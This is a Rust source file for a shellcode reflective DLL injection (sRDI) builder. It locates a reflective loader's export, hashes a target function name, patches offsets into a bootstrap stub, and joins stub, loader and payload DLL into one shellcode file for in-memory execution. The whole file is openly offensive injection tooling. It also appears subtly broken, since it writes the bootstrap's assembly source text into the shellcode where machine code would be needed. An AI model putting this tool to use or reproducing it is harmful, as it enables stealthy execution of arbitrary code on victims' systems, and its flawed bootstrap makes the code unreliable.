use std::{
    fs::{self},
};

use clap::{Parser, arg, command};

use crate::pe::{get_exports_by_name, dbj2_hash};
mod pe;

/// Shellcode Reflective DLL Injection (sRDI)
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// The reflective loader DLL path (loader.dll)
    #[arg(long)]
    loader: String,

    /// The payload DLL path (payload.dll)
    #[arg(long)]
    payload: String,

    /// The function to execute inside payload.dll (SayHello)
    #[arg(long)]
    function: String,

    /// The parameter to pass to the function inside payload.dll (https://localhost:1337/)
    #[arg(long)]
    parameter: String,

    /// The output file path (shellcode.bin)
    #[arg(long)]
    output: String,

   /// The 0x0 flag will execute DllMain and any other flag will execute the function inside payload.dll (SayHello)
   #[arg(long, default_value_t = 1)]
   flags: u32,
}

// This will need to change if you change the name of the Reflective Loader function
const LOADER_ENTRY_NAME: &str = "loader";

fn main() {
    let args = Args::parse();

    let loader_path = args.loader;
    let payload_path = args.payload;
    let function_name = args.function;
    let parameter_value = args.parameter;
    let output_path = args.output;
    let flags_value = args.flags;

    println!("Loader Path: {}", loader_path);
    println!("Payload Path: {}", payload_path);
    println!("Output Path: {}", output_path);


    let mut loader_bytes = std::fs::read(loader_path).expect("Failed to read loader path");
    let mut payload_bytes = std::fs::read(payload_path).expect("Failed to read payload path");
    let function_hash = dbj2_hash(function_name.as_bytes());

    let final_shellcode = convert_to_shellcode(&mut loader_bytes, &mut payload_bytes, function_hash, parameter_value, flags_value);

    fs::write(output_path, final_shellcode).expect("Failed to write the final shellcode to file");
}

fn convert_to_shellcode(loader_bytes: &mut Vec<u8>, payload_bytes: &mut Vec<u8>, function_hash: u32, parameter_value: String, flags_value: u32) -> Vec<u8> {

    // Get the reflective loader address in memory by name
    let loader_address = get_exports_by_name(loader_bytes.as_mut_ptr(), LOADER_ENTRY_NAME.to_owned())
        .expect("Failed to get reflective loader address by name");

    // Calculate the reflective loader offset (minus the module_base to get the offset)
    let loader_offset = loader_address as usize - loader_bytes.as_mut_ptr() as usize;
    println!("[+] Reflective Loader Offset: {:#x}", loader_offset);

    let mut bootstrap: Vec<u8> = Vec::new();

    // Add the bootstrap code
    bootstrap.extend_from_slice(include_bytes!("bootstrap.asm"));

    // Bootstrap length + Reflective Loader length = Payload.dll offset
    let payload_offset = bootstrap.len() + loader_bytes.len();

    // Replace placeholders with actual values
    let asm_code = String::from_utf8_lossy(&bootstrap);
    let asm_code = asm_code.replace("{function_hash}", &format!("0x{:08x}", function_hash));
    let asm_code = asm_code.replace("{payload_offset}", &format!("0x{:08x}", payload_offset));
    let asm_code = asm_code.replace("{payload_length}", &format!("0x{:x}", payload_bytes.len()));
    let asm_code = asm_code.replace("{parameter_length}", &format!("0x{:x}", parameter_value.len()));
    let asm_code = asm_code.replace("{flags}", &format!("0x{:x}", flags_value));

    let asm_code = asm_code.replace("{loader_offset}", &format!("0x{:08x}", loader_offset));

    println!("[+] Bootstrap Shellcode Length: {}", bootstrap.len());
    println!("[+] Reflective Loader Length: {}", loader_bytes.len());
    println!("[+] Payload DLL Length: {}", payload_bytes.len());

    let mut shellcode: Vec<u8> = Vec::new();

    // Bootstrap Shellcode populated with the correct offsets and values
    shellcode.append(&mut asm_code.as_bytes().to_vec());

    // Reflective Loader
    shellcode.append(loader_bytes);

    // Payload DLL
    shellcode.append(payload_bytes);


    println!("[+] Total Shellcode Length: {}", shellcode.len());

    return shellcode;
}